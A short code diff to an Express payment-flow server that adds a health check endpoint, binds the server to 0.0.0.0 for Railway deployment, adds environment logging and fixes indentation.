@@ -51,6 +51,11 @@ app.use(cors({
   methods: ['GET', 'POST']
 }));
 
+// CRITICAL: Add health check endpoint for Railway
+app.get('/health', (req, res) => {
+  res.status(200).send('OK');
+});
+
 // Helper function to check if a payment link is expired
 function getPaymentIdFromUrl(url) {
   if (!url) return null;
@@ -372,9 +377,11 @@ function cleanupInactiveVisitors() {
 // Serve static files
 app.use(express.static("."));
 
+// CRITICAL: Updated PORT and server configuration for Railway
 const PORT = process.env.PORT || 3000;
-const server = app.listen(PORT, () => {
+const server = app.listen(PORT, '0.0.0.0', () => {
   console.log(`Server running on port ${PORT}`);
+  console.log(`Server environment: ${process.env.NODE_ENV || 'development'}`);
   console.log(`Redirect file: ${PAYMENT_REDIRECT_FILE}`);
   
   // Start the cleanup interval for inactive visitors
@@ -695,7 +702,7 @@ app.get('/api/checkTransactionStatus', (req, res) => {
       fail: `/fail.html?invoiceId=${invoiceId}${txn.failureReason ? `&reason=${txn.failureReason}` : ''}`,
       bankpage: `/bankpage.html?invoiceId=${invoiceId}`
     };
-   return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
+    return res.json({ status: "redirect", redirectUrl: redirectUrls[txn.redirectStatus] });
   }
 
   res.json({ status: txn.status, otpError: txn.otpError });
